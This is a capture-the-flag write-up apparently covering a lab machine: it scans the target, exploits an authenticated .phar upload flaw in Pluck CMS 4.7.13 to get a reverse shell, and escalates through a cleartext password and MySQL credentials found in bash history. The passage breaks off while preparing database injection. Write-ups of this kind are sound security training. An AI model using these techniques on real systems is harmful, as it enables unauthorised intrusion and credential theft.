I always start with a ping to see that I have a connection to the machine and also figure out the OS of the machine.
```
sudo ping -c4 10.10.116.166
PING 10.10.116.166 (10.10.116.166) 56(84) bytes of data.
64 bytes from 10.10.116.166: icmp_seq=1 ttl=63 time=89.3 ms
64 bytes from 10.10.116.166: icmp_seq=2 ttl=63 time=86.3 ms
64 bytes from 10.10.116.166: icmp_seq=3 ttl=63 time=84.3 ms
64 bytes from 10.10.116.166: icmp_seq=4 ttl=63 time=103 ms

--- 10.10.116.166 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 84.333/90.641/102.610/7.131 ms
```
 
I then like to do a basic Nmap scan of all ports. Using sudo makes Nmap default to "Stealth scan".  
Machines rated "easy" rarely require scanning of all ports, but I like to scan them to ensure I'm not missing anything.  
```
sudo nmap -p- 10.10.116.166
Starting Nmap 7.94SVN ( https://nmap.org ) 
Nmap scan report for 10.10.116.166
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 301.79 seconds
```
 
So there are SSH and HTTP server ports open so let's look at them next in more depth. 
```
sudo nmap -sVC -p22,80 10.10.116.166
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.116.166
Host is up (0.098s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA)
|   256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA)
|_  256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```
 
HTTP server is only the default Apache page. Let's find some directories. My default is feroxbuster but gobuster or fuff are also good.
```
feroxbuster -u http://10.10.116.166

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.116.166
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      312c http://10.10.116.166/app => http://10.10.116.166/app/
301      GET        9l       28w      325c http://10.10.116.166/app/pluck-4.7.13 => http://10.10.116.166/app/pluck-4.7.13/
200      GET       15l       74w     6147c http://10.10.116.166/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.10.116.166/
[####################] - 74s    30007/30007   0s      found:4       errors:1
[####################] - 74s    30000/30000   404/s   http://10.10.116.166/
[####################] - 0s     30000/30000   138889/s http://10.10.116.166/app/ => Directory listing
```
 
There is `/app` which then has `/pluck-4.7.13`. The site has two links at the bottom. Another is to `www.pluck-cms.org` which redirects to the GitHub page of Pluck CMS and the other to an admin login page.  
The Login page only requires a password so I tried the most obvious one and got in. The password was the documented default one.  
The pluck CMS version is 4.7.13 so I searched vulnerabilities for in that version from searchsploit.  
```
searchsploit pluck 4.7.13
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)            | php/webapps/49909.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
 
There seems to be a file upload vulnerability. Looking at it a bit deeper reveals that the vulnerability is related to pluck CMS not blocking .phar extension.  
I used `PHP Ivan Sincek` from `https://www.revshells.com/` to create a reverse shell with .phar extension which I can upload to the admin page.  
The upload is successful and the panel gives us a handy link for the file so we don't even have to search for it. Let's then start ncat listener before going to the link and executing it.  
```
ncat -lvnp 1234
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.116.166:41598.
SOCKET: Shell has connected! PID: 39496
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
 
I checked if the machine has python3 installed to get a better, interactive shell. 
```
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL-Z
stty raw -echo && fg
```
 
I could not find anything of interest in the directories I landed to and then went to look in the home folders of the other users.  
There was nothing of interest in the `/home/lucien` folder that I could read. In the `/opt` directory on the other hand were two files that I could read.  
The file owned by lucien has a cleartext password that lets me SSH into the machine or optionally just use `su lucien`.   
Now we can read the `lucien_flag.txt`

Having the password of the user I want to see if the user can run commands as root or as another user.  
```
sudo -l
Matching Defaults entries for lucien on dreaming:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on dreaming:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```   
    
The file with the same name is in the `/opt` directory so let's look at that. The script connects as `death` user to the MySQL server, fetches data, and then prints it out using a shell command.  
The script in `/home/death/getDreams.py` has credentials but we can't read it. There might be credentials for the database somewhere. `lucien` has bash history on so let's look at that.  

There are a few commands in the history but one was used to log into the mysql and has a password in it. Let's test that.  
```
mysql -u lucien -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
    
It works so then we can try to input code into the MySQL database and see if the script executes it.  
`show databases;` shows us the databases in MySQL.  
`use library;` to use the `library` database.  
`show tables;` to show the tables in the selected database.  
`select * from dreams;` to show everything from the tables.  











